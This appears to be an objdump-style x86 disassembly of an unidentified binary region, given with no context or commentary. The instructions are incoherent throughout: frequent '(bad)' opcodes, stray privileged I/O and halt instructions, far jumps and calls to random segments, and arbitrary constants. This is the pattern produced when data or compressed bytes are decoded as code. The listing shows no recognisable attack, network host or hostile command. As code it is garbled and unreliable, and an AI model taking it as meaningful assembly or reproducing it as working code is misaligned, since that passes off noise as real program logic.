  41f51f:	xchg   BYTE PTR [ebp-0x53],dh
  41f522:	push   0xd387f796
  41f527:	xchg   esp,eax
  41f528:	stos   DWORD PTR es:[edi],eax
  41f529:	ins    BYTE PTR es:[edi],dx
  41f52a:	loopne 0x41f596
  41f52c:	sub    al,0x9b
  41f52e:	aam    0x55
	...
  41f538:	add    BYTE PTR [eax],al
  41f53a:	add    BYTE PTR [edi],ah
  41f53c:	ss lahf 
  41f53e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f544:	and    eax,0x4b48075b
  41f549:	adc    eax,0x1a36b41
  41f54e:	add    BYTE PTR [ebp-0x32000000],ch
  41f554:	lods   al,BYTE PTR ds:[esi]
  41f555:	adc    BYTE PTR [edx-0x1e],ch
  41f558:	sub    ecx,DWORD PTR [edi]
  41f55a:	(bad)
  41f55d:	add    ebp,DWORD PTR [edi+0x44eff406]
  41f563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f564:	push   ss
  41f565:	jecxz  0x41f59a
  41f567:	mov    ?,WORD PTR [ecx+0x23]
  41f56a:	dec    edi
  41f56b:	adc    eax,DWORD PTR [ebp+0x486c40f2]
  41f571:	inc    ebp
  41f572:	sub    eax,0x7794d694
  41f577:	popf   
  41f578:	popa   
  41f579:	(bad)
  41f57c:	fstp   DWORD PTR [ecx-0x7929f24d]
  41f582:	inc    esp
  41f583:	inc    ebx
  41f584:	inc    eax
  41f585:	lods   al,BYTE PTR ds:[esi]
  41f586:	std    
  41f587:	(bad)  
  41f588:	mov    eax,0x601b96a9
  41f58d:	cmc    
  41f58e:	gs loopne 0x41f538
  41f591:	dec    esi
  41f592:	push   0x3c
  41f594:	leave  
  41f595:	jle    0x41f5f4
  41f597:	mov    BYTE PTR [ebx-0x47],dl
  41f59a:	or     bl,cl
  41f59c:	scas   al,BYTE PTR es:[edi]
  41f59d:	mov    bh,0xf
  41f59f:	mov    ebx,0x9d59507c
  41f5a4:	mov    ah,0xe1
  41f5a6:	dec    edi
  41f5a7:	inc    DWORD PTR [ebp+0x63968cf4]
  41f5ad:	push   ebx
  41f5ae:	sub    eax,0x76def8b6
  41f5b3:	pushf  
  41f5b4:	shl    DWORD PTR [ecx+ebx*4],1
  41f5b7:	js     0x41f5df
  41f5b9:	int3   
  41f5ba:	mov    ah,0xa1
  41f5bc:	or     eax,0xa180752b
  41f5c1:	or     bl,BYTE PTR [edi-0x33]
  41f5c4:	aaa    
  41f5c5:	push   ebp
  41f5c6:	xchg   esi,eax
  41f5c7:	outs   dx,BYTE PTR ds:[esi]
  41f5c8:	jbe    0x41f5d6
  41f5ca:	inc    ebx
  41f5cb:	jl     0x41f59a
  41f5cd:	push   es
  41f5ce:	adc    al,0xcd
  41f5d0:	cmp    al,0xd7
  41f5d2:	jmp    0x78fc8c4c
  41f5d7:	addr16 jmp 0x860d3adb
  41f5dd:	sub    eax,0x793bcae
  41f5e2:	test   DWORD PTR [ecx+ecx*8-0x11],edx
  41f5e6:	jg     0x41f589
  41f5e8:	adc    ecx,esi
  41f5ea:	mov    cl,0xf
  41f5ec:	mov    al,0x94
  41f5ee:	add    al,0xd1
  41f5f0:	fcom   st(4)
  41f5f2:	mov    ebx,0x8509f79
  41f5f7:	lods   al,BYTE PTR ds:[esi]
  41f5f8:	xchg   ebx,eax
  41f5f9:	sub    DWORD PTR [eax-0x553666af],esi
  41f5ff:	enter  0x0,0x0
	...
  41f60b:	aaa    
  41f60c:	(bad)  
  41f60d:	out    0xc2,eax
  41f60f:	mul    ebx
  41f611:	aaa    
  41f612:	cmc    
  41f613:	xchg   ecx,eax
  41f614:	call   0x3a63:0x8cb2eef4
  41f61b:	sbb    BYTE PTR [ecx+eax*1+0xad00],ah
  41f622:	add    BYTE PTR [ebx],dh
  41f624:	stc    
  41f625:	(bad)  
  41f626:	jmp    0x858c3d45
  41f62b:	dec    edx
  41f62c:	mov    edx,0xb6a52777
  41f631:	ins    DWORD PTR es:[edi],dx
  41f632:	cdq    
  41f633:	js     0x41f655
  41f635:	enter  0xbede,0x11
  41f639:	ret    0x4bff
  41f63c:	cs out dx,eax
  41f63e:	pop    ss
  41f63f:	add    DWORD PTR [edx+0x1e2db4f6],ecx
  41f645:	clc    
  41f646:	scas   eax,DWORD PTR es:[edi]
  41f647:	loop   0x41f5d5
  41f649:	mov    eax,ds:0x2229eff1
  41f64e:	adc    eax,0x231b69d5
  41f653:	fcmovnb st,st(6)
  41f655:	das    
  41f656:	dec    ebx
  41f657:	dec    ecx
  41f658:	jge    0x41f638
  41f65a:	cld    
  41f65b:	repz popa 
  41f65d:	nop
  41f65e:	push   ss
  41f65f:	xor    DWORD PTR [edi-0x37837351],esi
  41f665:	push   ebx
  41f666:	outs   dx,BYTE PTR ds:[esi]
  41f667:	adc    DWORD PTR [esi],esp
  41f669:	(bad)  
  41f66a:	jo     0x41f640
  41f66c:	push   ss
  41f66d:	adc    eax,0x2bd81350
  41f672:	scas   eax,DWORD PTR es:[edi]
  41f673:	jno    0x41f67f
  41f675:	jnp    0x41f6e8
  41f677:	out    dx,al
  41f678:	pop    ebx
  41f679:	and    DWORD PTR [edx+0x55f5b54],0xdc40592c
  41f683:	stos   DWORD PTR es:[edi],eax
  41f684:	fldenv [ecx+0x6d5f0dfa]
  41f68a:	(bad)  
  41f68b:	xchg   ebx,eax
  41f68c:	adc    cl,BYTE PTR [ecx+eiz*4]
  41f68f:	push   0x812a18f9
  41f694:	or     BYTE PTR [eax-0x7],bh
  41f697:	jecxz  0x41f70f
  41f699:	in     eax,0x32
  41f69b:	out    dx,eax
  41f69c:	and    eax,eax
  41f69e:	and    dl,BYTE PTR [ecx+edi*4+0x111018e9]
  41f6a5:	hlt    
  41f6a6:	add    eax,0x19e277e2
  41f6ab:	pop    bp
  41f6ad:	adc    DWORD PTR [eax+0x17f1b60b],0xffffff9f
  41f6b4:	pop    ss
  41f6b5:	dec    eax
  41f6b6:	cmp    al,0xf8
  41f6b8:	pop    es
  41f6b9:	push   eax
  41f6ba:	mov    dh,0x0
  41f6bc:	jge    0x41f677
  41f6be:	popf   
  41f6bf:	(bad)  
  41f6c0:	adc    ebx,DWORD PTR [ebx-0x1f448b08]
  41f6c6:	leave  
  41f6c7:	pusha  
  41f6c8:	icebp  
  41f6c9:	test   al,0xee
  41f6cb:	in     eax,dx
  41f6cc:	sbb    BYTE PTR [ebx+ecx*2],bl
  41f6cf:	lock add BYTE PTR [eax],al
	...
  41f6da:	add    BYTE PTR [esi],dl
  41f6dc:	aad    0xdf
  41f6de:	out    dx,eax
  41f6df:	fucomip st,st(7)
  41f6e1:	ss std 
  41f6e3:	cmp    BYTE PTR [esi-0x3385a0c6],al
  41f6e9:	fwait
  41f6ea:	ja     0x41f6b1
  41f6ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ed:	add    DWORD PTR [eax],eax
  41f6ef:	lods   eax,DWORD PTR ds:[esi]
  41f6f0:	add    BYTE PTR [eax],al
  41f6f2:	add    BYTE PTR [ebx],al
  41f6f4:	repnz mov ebp,0xc0cad7f5
  41f6fa:	sub    DWORD PTR [ebx-0x7d],eax
  41f6fd:	dec    eax
  41f6fe:	ds je  0x41f76c
  41f701:	pop    ebx
  41f702:	cmp    bh,BYTE PTR [edi+eiz*2+0x7a587a02]
  41f709:	or     DWORD PTR [ebx],ebx
  41f70b:	fbstp  TBYTE PTR [esi+0x35322a2e]
  41f711:	jp     0x41f717
  41f713:	cld    
  41f714:	sbb    DWORD PTR [ecx-0x195dba7d],eax
  41f71a:	mov    DWORD PTR [ecx-0x280fd925],0x23b798b6
  41f724:	mov    ebp,0x2281575f
  41f729:	sbb    ah,ch
  41f72b:	adc    bh,BYTE PTR [eax+0x57]
  41f72e:	aad    0x65
  41f730:	nop
  41f731:	mov    cl,0x42
  41f733:	addr16 movsx edi,dl
  41f737:	dec    esi
  41f738:	div    DWORD PTR [ebp-0x59]
  41f73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f73d:	stos   BYTE PTR es:[edi],al
  41f73e:	retf   0xeec8
  41f741:	dec    ebp
  41f742:	adc    ebx,ebx
  41f744:	out    0xf8,eax
  41f746:	scas   al,BYTE PTR es:[edi]
  41f747:	pop    es
  41f748:	mov    ds:0xeb077344,al
  41f74d:	retf   
  41f74e:	push   ss
  41f74f:	vpunpcklqdq ymm7,ymm2,ymm0
  41f753:	cdq    
  41f754:	or     eax,0xdab61d3d
  41f759:	jno    0x41f713
  41f75b:	or     BYTE PTR [ecx+ebx*8-0x4f36c371],dh
  41f762:	sub    edx,edx
  41f764:	mov    ds:0xf28fa64c,al
  41f769:	mov    ah,0x87
  41f76b:	adc    DWORD PTR [ebx-0x3],ebx
  41f76e:	adc    DWORD PTR [ebx+0x53],edi
  41f771:	cs das 
  41f773:	cmc    
  41f774:	ds cmc 
  41f776:	dec    esi
  41f777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f778:	(bad)
  41f77b:	gs mov ah,0x13
  41f77e:	data16 cli 
  41f780:	add    cl,BYTE PTR [eax+0x43cd74ca]
  41f786:	ror    DWORD PTR [eax+0x70],cl
  41f789:	push   cs
  41f78a:	xor    bl,BYTE PTR [esi-0x59]
  41f78d:	aaa    
  41f78e:	push   esp
  41f78f:	cli    
  41f790:	xor    al,0xf2
  41f792:	shl    ah,cl
  41f794:	aam    0x62
  41f796:	push   ss
  41f797:	mov    DWORD PTR [edx],ebp
  41f799:	sbb    eax,0xc3d50fc0
  41f79e:	sbb    DWORD PTR [eax+0x0],0x0
  41f7a5:	add    BYTE PTR [eax],al
  41f7a7:	add    BYTE PTR [eax],al
  41f7a9:	add    BYTE PTR [eax],al
  41f7ab:	outs   dx,BYTE PTR ds:[esi]
  41f7ac:	jbe    0x41f792
  41f7ae:	retf   0xdafc
  41f7b1:	outs   dx,BYTE PTR ds:[esi]
  41f7b2:	neg    BYTE PTR [eax]
  41f7b4:	xchg   edx,eax
  41f7b5:	xchg   DWORD PTR [edi+0x22af0336],edx
  41f7bb:	jb     0x41f762
  41f7bd:	add    DWORD PTR [eax],eax
  41f7bf:	lods   eax,DWORD PTR ds:[esi]
  41f7c0:	add    BYTE PTR [eax],al
  41f7c2:	add    BYTE PTR [ecx+0x6f3ad16a],cl
  41f7c8:	sub    eax,0xbb9ade9d
  41f7cd:	arpl   bx,di
  41f7cf:	js     0x41f770
  41f7d1:	imul   ebx,DWORD PTR [ebx-0x640b204c],0x7d68bfb1
  41f7db:	xor    BYTE PTR [esi-0x4fac07fb],0xf2
  41f7e2:	pop    ebp
  41f7e3:	test   eax,0xfbe13a7d
  41f7e8:	shl    DWORD PTR [edi-0x42ac7eac],0x32
  41f7ef:	mov    eax,ds:0x2e231143
  41f7f4:	add    al,0x7e
  41f7f6:	int    0xa0
  41f7f8:	hlt    
  41f7f9:	lods   eax,DWORD PTR ds:[esi]
  41f7fa:	rcl    DWORD PTR [ebx],0x55
  41f7fd:	mov    ebx,0x2d8001b3
  41f802:	mov    WORD PTR [edx+0x3d545d61],di
  41f809:	jmp    0x293:0x5744e20a
  41f810:	xchg   ebp,eax
  41f811:	mov    ch,0xbc
  41f813:	mov    al,0x2d
  41f815:	rcl    esp,0x55
  41f818:	ja     0x41f7c3
  41f81a:	xchg   ebx,eax
  41f81b:	xlat   BYTE PTR ds:[ebx]
  41f81c:	push   ebp
  41f81d:	adc    ebp,DWORD PTR [ebp-0x23]
  41f820:	loope  0x41f884
  41f822:	mov    dl,0xd5
  41f824:	loope  0x41f80e
  41f826:	push   esi
  41f827:	mov    ah,0x95
  41f829:	cmp    eax,0x6d22dc28
  41f82e:	or     al,BYTE PTR [edx-0xca09f39]
  41f834:	in     al,dx
  41f835:	repnz shl esp,1
  41f838:	neg    DWORD PTR [esi+0x3e8ed864]
  41f83e:	inc    esi
  41f83f:	push   edi
  41f840:	xchg   ebp,eax
  41f841:	cmp    edx,ebx
  41f843:	jne    0x41f829
  41f845:	stos   BYTE PTR es:[edi],al
  41f846:	ja     0x41f861
  41f848:	xchg   bh,bl
  41f84a:	pop    es
  41f84b:	mov    esp,0x52f572f7
  41f850:	jnp    0x41f82a
  41f852:	and    BYTE PTR [esi-0x4780564],0x10
  41f859:	jmp    0x41f88c
  41f85b:	sub    DWORD PTR [edx],0xee1343c7
  41f861:	push   0xffffffa7
  41f863:	loope  0x41f8bf
  41f865:	sub    BYTE PTR [ecx+0x6ccebf41],0xb9
  41f86c:	mov    ah,0xc7
  41f86e:	cmp    ebx,DWORD PTR [ecx+0x0]
  41f874:	add    BYTE PTR [eax],al
  41f876:	add    BYTE PTR [eax],al
  41f878:	add    BYTE PTR [eax],al
  41f87a:	add    BYTE PTR [edx],bh
  41f87c:	push   edx
  41f87d:	les    ecx,FWORD PTR [edi]
  41f87f:	in     al,dx
  41f880:	lahf   
  41f881:	sti    
  41f882:	ja     0x41f87a
  41f884:	rcl    DWORD PTR [eax-0x6459e32d],1
  41f88a:	cmp    DWORD PTR [edi],ebx
  41f88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f88d:	add    DWORD PTR [eax],eax
  41f88f:	lods   eax,DWORD PTR ds:[esi]
  41f890:	add    BYTE PTR [eax],al
  41f892:	add    dl,dh
  41f894:	(bad)  
  41f895:	fwait
  41f896:	std    
  41f897:	pop    edx
  41f898:	les    ecx,FWORD PTR [eax+edx*4-0xc]
  41f89c:	not    DWORD PTR [ebx]
  41f89e:	out    dx,al
  41f89f:	cwde   
  41f8a0:	sub    BYTE PTR [edx+0x34],0x52
  41f8a4:	inc    edx
  41f8a5:	fwait
  41f8a6:	pop    ds
  41f8a7:	jmp    0x6ee3de52
  41f8ac:	sbb    eax,0x9e29fbd
  41f8b1:	and    esi,ebp
  41f8b3:	jae    0x41f8dd
  41f8b5:	(bad)  
  41f8b6:	add    ah,BYTE PTR [eax+0x53e5936c]
  41f8bc:	outs   dx,DWORD PTR ds:[esi]
  41f8bd:	jae    0x41f8d4
  41f8bf:	ss ins DWORD PTR es:[edi],dx
  41f8c1:	aad    0x9c
  41f8c3:	enter  0x8fe8,0x7d
  41f8c7:	sbb    DWORD PTR [eax+edi*4+0x13],0x8f3c1dd4
  41f8cf:	add    DWORD PTR [ebx],0xffffffda
  41f8d2:	cmc    
  41f8d3:	jg     0x41f90f
  41f8d5:	dec    eax
  41f8d6:	pop    edx
  41f8d7:	loop   0x41f8f8
  41f8d9:	ficom  DWORD PTR [edi+0x549e161e]
  41f8df:	fisttp WORD PTR [ecx-0x1a76f4f5]
  41f8e5:	sub    DWORD PTR [ecx],0xc25c7a2b
  41f8eb:	loop   0x41f91a
  41f8ed:	jno    0x41f873
  41f8ef:	dec    edi
  41f8f0:	lds    ebx,FWORD PTR [eax+0x13e3390f]
  41f8f6:	xor    al,ah
  41f8f8:	inc    ecx
  41f8f9:	jmp    0x3344:0x80d0f746
  41f900:	inc    esi
  41f901:	ss xchg ecx,eax
  41f903:	imul   esp,DWORD PTR [ebx-0x66e14c2a],0x5f9197cf
  41f90d:	cli    
  41f90e:	xor    al,0xf5
  41f910:	pop    ebp
  41f911:	add    esi,DWORD PTR [edi-0x34ee2545]
  41f917:	stos   BYTE PTR es:[edi],al
  41f918:	jb     0x41f924
  41f91a:	ret    0x9f60
  41f91d:	xchg   esp,eax
  41f91e:	aad    0xd8
  41f920:	jg     0x41f99e
  41f922:	mov    eax,ds:0xd3e5f7b8
  41f927:	cmc    
  41f928:	fstp   DWORD PTR [ebp+0x72]
  41f92b:	adc    ecx,edi
  41f92d:	clc    
  41f92e:	mov    bl,dl
  41f930:	sub    al,0xb4
  41f932:	int    0xb
  41f934:	sar    BYTE PTR [ecx],0x90
  41f937:	cli    
  41f938:	cli    
  41f939:	shl    BYTE PTR [edx],0x2c
  41f93c:	scas   eax,DWORD PTR es:[edi]
  41f93d:	mov    bh,0x4b
  41f93f:	sub    eax,DWORD PTR [eax]
	...
  41f949:	add    BYTE PTR [eax],al
  41f94b:	xchg   ebx,eax
  41f94c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f953:	push   eax
  41f954:	loopne 0x41f950
  41f956:	call   0xa6cc:0xb1921cdf
  41f95d:	add    DWORD PTR [eax],eax
  41f95f:	lods   eax,DWORD PTR ds:[esi]
  41f960:	add    BYTE PTR [eax],al
  41f962:	add    BYTE PTR [ebx],ch
  41f964:	and    al,0x17
  41f966:	test   al,0x2f
  41f968:	add    al,0xb
  41f96a:	lods   al,BYTE PTR ds:[esi]
  41f96b:	jne    0x41f9a8
  41f96d:	xchg   edx,eax
  41f96e:	scas   eax,DWORD PTR es:[edi]
  41f96f:	(bad)  [esi]
  41f971:	clc    
  41f972:	imul   DWORD PTR [edx-0x76]
  41f975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f976:	adc    eax,0xfd60f81a
  41f97b:	ds js  0x41f94e
  41f97e:	aaa    
  41f97f:	jge    0x41f964
  41f981:	ins    DWORD PTR es:[edi],dx
  41f982:	jl     0x41f939
  41f984:	shl    BYTE PTR [esi],cl
  41f986:	adc    ecx,DWORD PTR es:[ebx-0x41fad34f]
  41f98d:	ss retf 0x60c0
  41f991:	repnz or esp,DWORD PTR [eax-0x1]
  41f995:	xor    ah,BYTE PTR [edi]
  41f997:	test   al,0x41
  41f999:	or     DWORD PTR [ebp+0x1a],esp
  41f99c:	addr16 mov edi,0xa4d376dd
  41f9a2:	ja     0x41f9d8
  41f9a4:	add    cl,BYTE PTR [ebx]
  41f9a6:	push   0xffffff8e
  41f9a8:	jg     0x41f9ab
  41f9aa:	test   BYTE PTR [esi+0x70273674],0x78
  41f9b1:	sbb    edi,DWORD PTR [esi-0x43]
  41f9b4:	std    
  41f9b5:	lahf   
  41f9b6:	jmp    0x9358:0x2f267c07
  41f9bd:	and    eax,0xc72469ce
  41f9c2:	add    eax,0x9d55ac74
  41f9c7:	jmp    0xf3b4345c
  41f9cc:	adc    eax,0xaea62da6
  41f9d1:	js     0x41f9ac
  41f9d3:	mov    ch,0x47
  41f9d5:	or     BYTE PTR [esi-0x6ec1a619],0xa2
  41f9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9dd:	dec    ebp
  41f9de:	jne    0x41fa4f
  41f9e0:	dec    ecx
  41f9e1:	int3   
  41f9e2:	pop    ds
  41f9e3:	in     eax,0xf2
  41f9e5:	xchg   DWORD PTR ds:[eax-0x4e],esi
  41f9e9:	xchg   ebp,esi
  41f9eb:	pop    ebx
  41f9ec:	ins    DWORD PTR es:[edi],dx
  41f9ed:	jne    0x41f975
  41f9ef:	out    0xd9,eax
  41f9f1:	(bad)  
  41f9f2:	stc    
  41f9f3:	aas    
  41f9f4:	mov    ebx,0xd9a6e805
  41f9f9:	sbb    ch,BYTE PTR [esi]
  41f9fb:	mov    ch,0x26
  41f9fd:	push   0x4a
  41f9ff:	jl     0x41fa1e
  41fa01:	rcr    ah,0x29
  41fa04:	into   
  41fa05:	ja     0x41f9d8
  41fa07:	sub    DWORD PTR [ebp-0x4],0xa57e623
  41fa0e:	jno    0x41f9dc
	...
  41fa18:	add    BYTE PTR [eax],al
  41fa1a:	add    ah,bl
  41fa1c:	fincstp 
  41fa1e:	shl    bh,0xee
  41fa21:	(bad)  
  41fa22:	frstor [ecx+eax*1]
  41fa25:	pop    ebp
  41fa26:	dec    edi
  41fa27:	pushf  
  41fa28:	ror    DWORD PTR [esi],1
  41fa2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa2b:	jns    0x41f9d4
  41fa2d:	add    DWORD PTR [eax],eax
  41fa2f:	lods   eax,DWORD PTR ds:[esi]
  41fa30:	add    BYTE PTR [eax],al
  41fa32:	add    BYTE PTR [ecx],dh
  41fa34:	pusha  
  41fa35:	mov    bh,bl
  41fa37:	cmc    
  41fa38:	pop    ecx
  41fa39:	push   edx
  41fa3a:	and    eax,0x45fcdd24
  41fa3f:	dec    ecx
  41fa40:	clc    
  41fa41:	jb     0x41f9de
  41fa43:	jge    0x41fa0d
  41fa45:	or     eax,0x194e7e25
  41fa4a:	adc    ebp,esi
  41fa4c:	ror    DWORD PTR [eax-0x13],cl
  41fa4f:	pop    ss
  41fa50:	ins    BYTE PTR es:[edi],dx
  41fa51:	xor    eax,0xcce2e371
  41fa56:	int3   
  41fa57:	outs   dx,DWORD PTR ds:[esi]
  41fa58:	aas    
  41fa59:	cs push 0xffffff84
  41fa5c:	enter  0x9daf,0x2e
  41fa60:	add    dl,BYTE PTR [esi]
  41fa62:	nop
  41fa63:	test   eax,0xd250f6a8
  41fa68:	mov    WORD PTR [eax-0x160a5285],es
  41fa6e:	push   ebp
  41fa6f:	jae    0x41fa98
  41fa71:	lock xchg esp,eax
  41fa73:	dec    ebx
  41fa74:	dec    ecx
  41fa75:	cli    
  41fa76:	add    ebp,eax
  41fa78:	inc    ecx
  41fa79:	and    BYTE PTR [esi+eiz*4+0x6eb808f8],dh
  41fa80:	sbb    BYTE PTR [ecx],al
  41fa82:	les    ecx,FWORD PTR [esi+0x40]
  41fa85:	xchg   esi,eax
  41fa86:	pop    edx
  41fa87:	push   ds
  41fa88:	dec    esi
  41fa89:	mov    dl,0x19
  41fa8b:	rol    BYTE PTR [edi-0x62],0x3
  41fa8f:	jno    0x41faaf
  41fa91:	mov    ch,BYTE PTR cs:[edx]
  41fa94:	pop    ebx
  41fa95:	mov    al,ds:0x7c034bf
  41fa9a:	mov    esp,DWORD PTR [edx-0x1528cb85]
  41faa0:	enter  0xd7e5,0xae
  41faa4:	out    0x17,eax
  41faa6:	lock bound ecx,QWORD PTR [esi]
  41faa9:	xchg   edi,eax
  41faaa:	xchg   DWORD PTR [eax],esi
  41faac:	mov    ds:0x50f569ce,eax
  41fab1:	pop    edi
  41fab2:	cs ins BYTE PTR es:[edi],dx
  41fab4:	lods   al,BYTE PTR ds:[esi]
  41fab5:	add    DWORD PTR [edi-0x339e32d9],0xffffffe0
  41fabc:	out    dx,al
  41fabd:	or     eax,0xb35447
  41fac2:	faddp  st(1),st
  41fac4:	imul   BYTE PTR [eax+0x37]
  41fac7:	div    DWORD PTR [ecx-0x44554339]
  41facd:	stos   BYTE PTR es:[edi],al
  41face:	push   esp
  41facf:	push   ds
  41fad0:	lods   al,BYTE PTR ds:[esi]
  41fad1:	loopne 0x41fb10
  41fad3:	dec    eax
  41fad4:	push   ebp
  41fad5:	mov    cl,0x4f
  41fad7:	sub    bl,bh
  41fad9:	mov    edx,0x598d87c1
  41fade:	mov    edx,DWORD PTR [eax]
	...
  41fae8:	add    BYTE PTR [eax],al
  41faea:	add    BYTE PTR [edi-0x5e],ch
  41faed:	aam    0x2a
  41faef:	fnstsw WORD PTR [esi-0x1]
  41faf2:	out    0x52,eax
  41faf4:	fcmovu st,st(5)
  41faf6:	in     eax,0x32
  41faf8:	add    al,0x9d
  41fafa:	loop   0x41fb22
  41fafc:	test   al,0x1
  41fafe:	add    BYTE PTR [ebp-0x20000000],ch
  41fb04:	xchg   edi,edi
  41fb06:	in     al,0x44
  41fb08:	(bad)  
  41fb09:	stos   BYTE PTR es:[edi],al
  41fb0a:	mov    bl,0xcd
  41fb0c:	or     eax,0xfe3b67c5
  41fb11:	test   BYTE PTR [esi+0x573d1794],dl
  41fb17:	pop    esi
  41fb18:	jle    0x41fb91
  41fb1a:	and    BYTE PTR [eax-0x6ea28dc8],cl
  41fb20:	adc    DWORD PTR [eax*8+0x65a3020f],edi
  41fb27:	repz (bad) 
  41fb29:	push   edx
  41fb2a:	ds jle 0x41fb03
  41fb2d:	dec    eax
  41fb2e:	imul   ebx,edi,0x3ff15012
  41fb34:	dec    eax
  41fb35:	push   ecx
  41fb36:	outs   dx,BYTE PTR fs:[esi]
  41fb38:	push   esp
  41fb39:	pop    es
  41fb3a:	add    esi,DWORD PTR [eax+0x363e1637]
  41fb40:	mov    ds:0xe5b311ef,al
  41fb45:	int    0x8d
  41fb47:	icebp  
  41fb48:	nop
  41fb49:	ret    
  41fb4a:	das    
  41fb4b:	add    BYTE PTR [edx-0x71],al
  41fb4e:	outs   dx,BYTE PTR ds:[esi]
  41fb4f:	inc    ecx
  41fb50:	sahf   
  41fb51:	js     0x41fb19
  41fb53:	out    dx,al
  41fb54:	mov    ds,WORD PTR ds:0x412aeb10
  41fb5a:	mov    eax,ds:0xe454ad47
  41fb5f:	dec    ebx
  41fb60:	add    DWORD PTR [edx-0x6cfb9b80],0x409fca02
  41fb6a:	loopne 0x41fbea
  41fb6c:	mov    edi,0x3cb24d27
  41fb71:	cmp    DWORD PTR [edx-0x61d02111],0xffffffd4
  41fb78:	mov    ebx,0x7fb29289
  41fb7d:	popf   
  41fb7e:	js     0x41fb6a
  41fb80:	and    ebp,DWORD PTR [edx+0x72]
  41fb83:	sub    esi,edx
  41fb85:	sbb    ch,BYTE PTR [edx]
  41fb87:	add    bh,BYTE PTR [esi-0x1e8d908e]
  41fb8d:	cmp    esp,esp
  41fb8f:	mov    dl,0x71
  41fb91:	fs mov bh,0xf8
  41fb94:	frstor [edi+esi*1+0x1b8371ff]
  41fb9b:	pop    edi
  41fb9c:	ja     0x41fbb5
  41fb9e:	mov    edi,0xa84ff30e
  41fba3:	dec    esi
  41fba5:	mov    dl,0x4e
  41fba7:	je     0x41fb2f
  41fba9:	ins    BYTE PTR es:[edi],dx
  41fbaa:	inc    ebp
  41fbab:	cli    
  41fbac:	div    BYTE PTR ds:0x49f3
	...
  41fbba:	add    cl,bh
  41fbbc:	sbb    al,al
  41fbbe:	inc    esi
  41fbbf:	jecxz  0x41fb9f
  41fbc1:	(bad)  
  41fbc2:	mov    edi,0xe1f1bc83
  41fbc7:	pop    esi
  41fbc8:	gs or  al,0x25
  41fbcb:	shr    DWORD PTR [eax+0xad0001],cl
  41fbd1:	add    BYTE PTR [eax],al
  41fbd3:	not    ah
  41fbd5:	leave  
  41fbd6:	call   0x569eee3f
  41fbdb:	push   ebp
  41fbdc:	adc    edi,DWORD PTR [eax+edi*1-0x51]
  41fbe0:	inc    esi
  41fbe1:	xchg   esp,eax
  41fbe2:	jmp    0x7672:0x115da05c
  41fbe9:	fisubr WORD PTR [esi]
  41fbeb:	xchg   esp,eax
  41fbec:	sub    dl,cl
  41fbee:	stos   BYTE PTR es:[edi],al
  41fbef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbf0:	dec    ebp
  41fbf1:	sub    DWORD PTR [ebp-0x2a],ebx
  41fbf4:	and    al,0xae
  41fbf6:	cmp    esi,DWORD PTR [eax+0x2bdc148e]
  41fbfc:	xchg   esi,eax
  41fbfd:	mov    edi,eax
  41fbff:	aam    0x1d
  41fc01:	adc    al,0xab
  41fc03:	xchg   esi,eax
  41fc04:	add    ch,ch
  41fc06:	inc    ebx
  41fc07:	cmc    
  41fc08:	daa    
  41fc09:	cwde   
  41fc0a:	adc    ebp,DWORD PTR [ebx]
  41fc0c:	fist   DWORD PTR ds:0xb691ecad
  41fc12:	or     cl,BYTE PTR [ecx+0x1a]
  41fc15:	mov    ecx,0xf364b951
  41fc1a:	push   0x37a1de90
  41fc1f:	enter  0x9acb,0x47
  41fc23:	mov    ebx,0xadc492e0
  41fc28:	mov    ebp,0x15d7faa2
  41fc2d:	adc    bh,BYTE PTR ds:0x4ca1932e
  41fc33:	jmp    0x41fc8e
  41fc35:	inc    eax
  41fc36:	pop    esi
  41fc37:	push   ecx
  41fc38:	and    al,0x97
  41fc3a:	(bad)  
  41fc3b:	push   ss
  41fc3c:	mov    ah,0xca
  41fc3e:	or     al,0x74
  41fc40:	jo     0x41fc68
  41fc42:	mov    ah,0x60
  41fc44:	cld    
  41fc45:	scas   al,BYTE PTR es:[edi]
  41fc46:	mov    cl,0x27
  41fc48:	dec    ebp
  41fc49:	ja     0x41fc94
  41fc4b:	or     DWORD PTR [edi+0x382cbe19],0x4fb694e4
  41fc55:	and    bh,BYTE PTR [ebx]
  41fc57:	(bad)  
  41fc58:	aam    0xe
  41fc5a:	cmp    BYTE PTR [ebx],ah
  41fc5c:	sti    
  41fc5d:	inc    edi
  41fc5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc5f:	xlat   BYTE PTR ds:[ebx]
  41fc60:	jecxz  0x41fc2c
  41fc62:	sbb    BYTE PTR [edx+esi*2+0x2a],dl
  41fc66:	sar    ecx,0x48
  41fc69:	and    ebp,DWORD PTR [esi-0x19]
  41fc6c:	cwde   
  41fc6d:	add    DWORD PTR [ebx],edi
  41fc6f:	and    bh,BYTE PTR [ebx]
  41fc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc72:	jge    0x41fc26
  41fc74:	xor    BYTE PTR [edi+0x69],dh
  41fc77:	call   edi
  41fc79:	sbb    DWORD PTR [edx],eax
  41fc7b:	outs   dx,BYTE PTR ds:[esi]
  41fc7c:	and    DWORD PTR [edi+0x5986],ecx
	...
  41fc8a:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fc90:	(bad)  
  41fc91:	mov    ch,0xbb
  41fc93:	icebp  
  41fc94:	and    eax,0xfde08c27
  41fc99:	arpl   WORD PTR [ebx],ax
  41fc9b:	sub    BYTE PTR [ecx+0xad0001],0x0
  41fca2:	add    BYTE PTR [ecx+0x4d],bl
  41fca5:	push   0x2e
  41fca7:	push   eax
  41fca8:	push   ebp
  41fca9:	retf   
  41fcaa:	inc    eax
  41fcab:	call   0x88d0:0x257c116e
  41fcb2:	push   esp
  41fcb3:	sub    edi,DWORD PTR [ebx+0x652b1215]
  41fcb9:	jle    0x41fd1b
  41fcbb:	push   esp
  41fcbc:	bound  esi,QWORD PTR ds:0xbe80dbb2
  41fcc2:	test   al,0xde
  41fcc4:	sbb    al,0x62
